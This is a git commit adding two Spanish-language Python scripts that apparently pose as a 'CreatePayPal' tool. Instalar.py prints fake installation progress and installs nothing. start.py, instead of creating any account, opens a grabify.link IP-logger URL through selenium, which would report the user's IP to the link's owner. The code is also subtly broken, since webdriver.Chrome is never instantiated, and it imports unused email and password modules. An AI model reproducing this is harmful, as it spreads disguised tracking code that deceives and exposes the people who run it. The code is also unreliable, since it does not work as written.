32fd4c34f7d6217f902d55340847a1744e04cb29
RIP-Network <93273837+RIP-Network@users.noreply.github.com>
2022-01-19 10:19:02 +0000

    Add files via upload

---
+++ Instalar.py
@@ -0,0 +1,22 @@
+import smtplib, ssl
+import os
+import time
+import getpass
+
+#colores
+negro = '\033[30m'
+rojo = '\033[31m'
+verde = '\033[32m'
+amarillo = '\033[33m'
+azul = '\033[34m'
+rosado = '\033[35m'
+calipso= '\033[36m'
+blanco = '\033[37m'
+cierre = '\033[39m'
+
+print(rojo+"Instalando archivos por favor espere"+cierre)
+time.sleep(3)
+print(blanco+"Ya casi estamos aguarde un poco mas")
+time.sleep(2)
+print(blanco+"Programa instalado con exito ! , vaya a la carpeta de CreatePayPal y ejecute con Python3 start.py")
+print(blanco+"se requiere VPN en Estados Unidos!!!!!")
---
+++ start.py
@@ -0,0 +1,25 @@
+import smtplib, ssl
+import os
+import time
+import getpass
+
+#colores
+negro = '\033[30m'
+rojo = '\033[31m'
+verde = '\033[32m'
+amarillo = '\033[33m'
+azul = '\033[34m'
+rosado = '\033[35m'
+calipso= '\033[36m'
+blanco = '\033[37m'
+cierre = '\033[39m'
+
+print(blanco+"Iniciando , espero que le guste!")
+
+from selenium import webdriver
+import time
+
+web = webdriver.Chrome
+
+web.get('https://grabify.link/B1BB6Z')
+time.sleep(1)
